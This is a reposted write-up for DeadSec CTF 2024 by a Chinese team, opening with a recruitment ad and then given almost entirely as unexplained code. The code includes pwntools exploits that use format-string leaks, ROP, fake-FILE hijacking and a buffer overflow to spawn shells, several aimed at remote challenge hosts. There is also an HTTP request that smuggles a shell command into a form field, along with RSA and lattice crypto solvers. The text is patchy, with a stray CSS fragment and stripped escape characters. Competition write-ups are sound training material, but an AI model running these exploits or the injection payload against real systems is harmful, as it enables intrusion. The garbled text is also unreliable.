# DeadSec CTF 2024 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/196213.html
> ID: 196213

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import *
import re

p = process('./user_management')
# p = gdb.debug('./user_management','b *$rebase(0x0000000000001E63)')
elf = ELF('./user_management')
libc = ELF('./libc.so.6')
rop = ROP(libc)
def root_login():
    p.sendlineafter(b'ce: ', str(1))
    p.sendlineafter(b' here?',b'manage usersaaaax00')
    p.sendlineafter(b'ame: ',b'MrAlphaQ')
    p.sendlineafter(b'rd: ',b'x00')

def add_user(desc,name,passwd=b'0rb1t'):
    p.sendlineafter(b'ce: ',str(2))
    p.sendlineafter(b'ame: ',name)
    p.sendlineafter(b'rd: ',passwd)
    p.sendlineafter(b'ion: ',desc)

def login(name,passwd=b'0rb1t'):
    p.sendlineafter(b'ce: ',str(3))
    p.sendlineafter(b'ame: ',name)
    p.sendlineafter(b'rd: ',passwd)

def logout():
    p.sendlineafter(b'ce: ', str(4))

def vuln():
    p.sendlineafter(b'ce: ', str(5))

def generate_fmt(addr,value):
    d1 = value % 0x10000
    d2 = value//0x10000 % 0x10000
    d3 = value//0x10000//0x10000 % 0x10000
    dct = sorted([(0,d1),(1,d2),(2,d3)],key=lambda x:x[1])
    payload = b'%c'*14+b'%'+str(dct[0][1]-14).encode(encoding='latin1')+b'c%hn'+b'%'+str(dct[1][1]-dct[0][1]).encode(encoding='latin1')+b'c%hn'+b'%'+str(dct[2][1]-dct[1][1]).encode(encoding='latin1')+b'c%hn'
    payload = payload.ljust((16-6)*8,b'a')
    payload += p64(addr+dct[0][0]*2)+p64(0)+p64(addr+dct[1][0]*2)+p64(0)+p64(addr+dct[2][0]*2)
    return payload
    
def pwn():
    root_login()
    add_user("%c."*45+"aaaa.%p.%p.%p.%p.%paaaa.%p.",'1')
    logout()
    login('1')
    vuln()
    p.recvuntil('aaaa.')
    stack = int(p.recvuntil('.')[:-1],16)
    printf_ret = stack-0x168
    elf.address = int(p.recvuntil('.')[:-1],16)-0x2037
    p.recvuntil('aaaa.')
    libc.address = int(p.recvuntil('.')[:-1],16)-0x29d90
    print('stack:',hex(stack))
    print('elf:',hex(elf.address))
    print('libc:',hex(libc.address))
    root_login()
    payload = generate_fmt(stack-0x168,libc.symbols['gets'])
    add_user(payload,'2')
    logout()
    login('2')
    vuln()
    rdi_ret = libc.address+rop.find_gadget(['pop rdi','ret'])[0]
    p.sendline(b'a'*0x2200+p64(rdi_ret)+p64(next(libc.search(b'/bin/sh')))+p64(libc.symbols['system']))
    p.interactive()

pwn()
Dockerfile
from pwn import *

# p = process('./prob')
# p = gdb.debug('./prob')
p = remote('34.135.27.226',31665)
elf = ELF('./prob')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def send_msg(idx,data):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'ex: ',str(idx))
    p.sendlineafter(b'sg: ',data)

def show_msg(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'ex: ', str(idx))

def pwn():
    send_msg(0,b'aaaa')
    show_msg(2)
    p.recvuntil("msg ===n")
    nkey = p.recv(6)
    key = p8(nkey[0]^0x60)
    key += p8(nkey[1]^(((key[0]<<4)&0xff)|0x3))
    key += p8(nkey[2]^(((key[1] << 4)&0xff)|(key[0]>>4)))
    key += p8(nkey[3]^(((key[2] << 4)&0xff)|(key[1]>>4)))
    key += p8(nkey[4]^(((key[3] << 4)&0xff)|(key[2]>>4)))
    key = u64(key.ljust(8,b'x00'))
    heap = key<<12
    print('heap:',hex(heap))
    send_msg(0,b'a'*0x28+p64(heap+0x2a0))
    show_msg(1)
    p.recvuntil("msg ===n")
    libc.address = u64(p.recv(6).ljust(8,b'x00'))-0x29d90
    print('libc:',hex(libc.address))
    stdout = libc.address + 0x21b780
    wfile_jump = libc.address+0x2170c0
    lock = libc.address+0x21ca70
    fake_io = flat({
        0x0: b' sh;',
        0xa0: p64(stdout),
        0x10: p64(libc.symbols['system']),
        0x20: p64(stdout),
        0xd8: p64(wfile_jump + 0x48 - 0x38),
        0x88: p64(lock),
        0xe0: p64(stdout - 8),
    }, filler=b'x00')
    send_msg(-4,b'a'*0x5d+fake_io)
    p.interactive()

pwn()
Dockerfile
from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
    #def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
pr = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
    #context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')    
    #libc=ELF('/lib/i386-linux-gnu/libc.so.6')
    #libc=ELF('libc-2.23.so') 
    #libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
    #libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
    #p=remote('34.121.62.108',32257)
p = process('./pwn')
backdoor=0x401748 
rl("> ")
sl(str(1))
rl("> ")
sl(str(0.0))
rl("> ")
sl(str(-0.0))
rl("> ")
sl(str(1337))
rl("> ")
payload=b'a'*(0x400+8)+p64(backdoor)
    #bug()
s(payload)
inter()
input[type="file"] {
            margin-bottom: 1em;
        }
        input[type="submit"] {
            background-color: #333;
            color: #fff;
            border: none;
            padding: 0.5em 1em;
            border-radius: 4px;
            cursor: pointer;
        }
POST /bing.php HTTP/2
Host: 7e8ebe49c38cdf1e8cdaa4dc.deadsec.quest
Content-Length: 252
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWbstEqtHwNwJmXAJ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9

------WebKitFormBoundaryWbstEqtHwNwJmXAJ
Content-Disposition: form-data; name="ip"

;tac${IFS}/fla*.txt;
------WebKitFormBoundaryWbstEqtHwNwJmXAJ
Content-Disposition: form-data; name="Submit"

Upload
------WebKitFormBoundaryWbstEqtHwNwJmXAJ--
ezstart.zip: https://drive.proton.me/urls/QVWQK2SW0R#fEepu7MJU6XY
Bing2.zip: https://drive.proton.me/urls/JFNPCV77V4#dLqn62g51E4N
Bing_revenge.zip: https://drive.proton.me/urls/B53WQK787C#sMmQvNMuda9G
# '002e2'
# '0e98b0000a'
# '0e98b10324'
# '0e98b10324002e2'
# '0e98b103240e99c00047'
from tqdm import tqdm
from binascii import hexlify
from Crypto.Util.number import *

def FLAG_KILLER(value):
    index = 0
    temp = []
    output = 0
    while value > 0:
        temp.append(2 - (value % 4) if value % 2 != 0 else 0)
        value = (value - temp[index])/2
        index += 1
    temp = temp[::-1]
    for index in range(len(temp)):
        output += temp[index] * 3 ** (len(temp) - index - 1)
    return output

outpute = '0e98b103240e99c71e320dd330dd430de2629ce326a4a2b6b90cd201030926a090cfc5269f904f740cd1001c290cd10002900cd100ee59269a8269a026a4a2d05a269a82aa850d03a2b6b900883'
m = b'DEAD{'
for i in range(32,127):
    flag = hexlify(m+long_to_bytes(i)).decode()
    index = 0
    output = ''
    while index < len(flag):
        output += '%05x' % int(FLAG_KILLER(int(flag[index:
index + 3], 16)))
        index += 3
    if output == outpute[:20]:
        m += long_to_bytes(i)
        print(m,output)
        break

k = []
for i1 in tqdm(range(32,127)):
    for i2 in range(32,127):
        for i3 in range(32,127):
            k.append(long_to_bytes(i1)+long_to_bytes(i2)+long_to_bytes(i3))

for i in range(13):
    for i1 in tqdm(range(len(k))):
        flag = hexlify(m + k[i1]).decode()
        index = 0
        output = ''
        while index < len(flag):
            output += '%05x' % int(FLAG_KILLER(int(flag[index:
index + 3], 16)))
            index += 3
        if output == outpute[:30+i*10]:
            m += k[i1]
            print(m,output,outpute[:30+i*10])
            break

# m = b'DEAD{263f871e880e9dc7d24010003'
# for i in tqdm(range(32,127)):
#     flag = hexlify(m+long_to_bytes(i)+b'}').decode()
#     index = 0
#     output = ''
#     while index < len(flag):
#         output += '%05x' % int(FLAG_KILLER(int(flag[index:
index + 3], 16)))
#         index += 3
#     if output == outpute:
#         m += long_to_bytes(i)
#         print(m,output)
#         break
from Crypto.Util.number import *
from sage.all import *
q2=1651764208712002362909070586532659043033781575172011989418709627827265240039573208353001543
n2=4567679107460506699894309910336431579400633228244128306497666626803408363
0735700946472676852534025506807314001461603559827433723291528233236210007601
4543768762346118946864338905885984971949815405538148587260662152040345178087
2623010855038440066577237005534497330976725473056684523616746047123285553513
1280959838577294392570538301153645042892860893604629926657287846345355440026
4538835194931512992262898193750735079788357964368342055950293971338823441203
5963132607119750408781134835310758535252543695711756199704093406788158541637
5733220284897170841715716721313708208669285280362958902914780961119036511592
6074730632477214277658499624003220518758883236381894341174523091936541418819
14639294164650898861297303
c2=3390569979784056878736266202871557824004856366694719533085092616630555208
1119734435874390525929981020554886322071609684906057548610615460198369663491
9001826709888982308671804222058628572899417939318387015526693328204333475530
4139243271973119125463775794806745935480171168951943663617953860813929121178
4317374772409256689946655438333099663782185722477681700436098795049555629932
8111205593154297155361362920330179816178178625355967900280582009271631490604
3601765180455118897800232982799905604384587625502913096329061269176369601390
5788625093474796946974095454955921606955300371138844430716930909499088581721
0508959705179069486376112962685773746849343845915866934243046874123657332165
8187309329276080990875017
p2=sqrt(n2//q2)
phi=p2*(p2-1)*(q2-1)
e = 65537
d = inverse_mod(e,phi)
long_to_bytes(int(pow(c2,d,n2)))

    #b'DEAD{Rual_R0s4s_Chiweweiner!!}'
from Crypto.Util.number import *
from pwn import *
from random import randrange

# context.log_level = 'debug'
sh = remote('34.44.175.226' ,'31617')
for i in range(1,101):
    sh.recvuntil(f'Stage {i}n'.encode())
    K = sh.recvuntil(b'n')[:-1].split(b' ')
    # print(K)
    k = []
    for j in K:
        k.append(int(j))

    A = []
    for j in range(i+1):
        x = [0*i for i in range(i+1)]
        A.append(x)
    for j in range(i):
        A[j][j] = 1
        A[j][-1] = k[j]
    A[-1][-1] = -k[-1]
    # print(A)
    AA = matrix(ZZ,A)
    A_solve = AA.LLL()
    if i >= 70:
        A_solve = A_solve.BKZ()
    # print(A_solve)
    for j in A_solve:
        if j[-1] == 0:
            print(j)
            num = 0
            M = ''
            for j0 in j[:-1]:
                if j0 == 1:
                    M += str(num)
                    M += ' '
                num += 1
            sh.sendline(M.encode())
            sh.recvuntil(f'Stage {i} Clear'.encode())
            break

sh.interactive()
from pwn import *
import re
sh = remote("34.132.190.59", 31345)

result = sh.recvline()
for i in range(100):
    res = re.findall(b"mic test >  (.*) [",result)
    # print(res[0])
    sh.sendlineafter(b'submit test words >', res[0])
    result = sh.recvline()
    print(result)
sh.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/10-1722299157.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/5-1722299158.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/8-1722299159.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/07/4-1722299160.webp)